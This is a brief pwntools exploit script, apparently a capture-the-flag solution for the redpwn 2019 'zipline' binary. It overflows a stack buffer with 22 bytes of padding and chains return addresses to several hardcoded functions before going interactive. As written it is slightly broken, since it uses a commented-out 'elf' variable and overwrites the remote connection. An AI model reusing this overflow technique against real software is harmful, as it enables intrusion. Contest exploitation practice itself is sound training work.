from pwn import *

ip = "chall.2019.redpwn.net"
port = 4005
r = remote(ip,port)

# elf = 'zipline' 
r = process("./"+elf)
a = 0x08049216 #air
b = 0x0804926d #water
c = 0x080492c4 #land
d = 0x0804931b #underground
e = 0x08049372 #limbo
f = 0x080493c9 #hell
g = 0x08049420 #minecraft_nether
h = 0x08049477 #bedrock
igotum = 0x08049569 #inmain

offset = 22
payload = 'a' * offset + p32(a) + p32(b) + p32(c) + p32(d) + p32(e) + p32(f) + p32(g) + p32(h) + p32(igotum)
r.sendline(payload)
r.interactive()
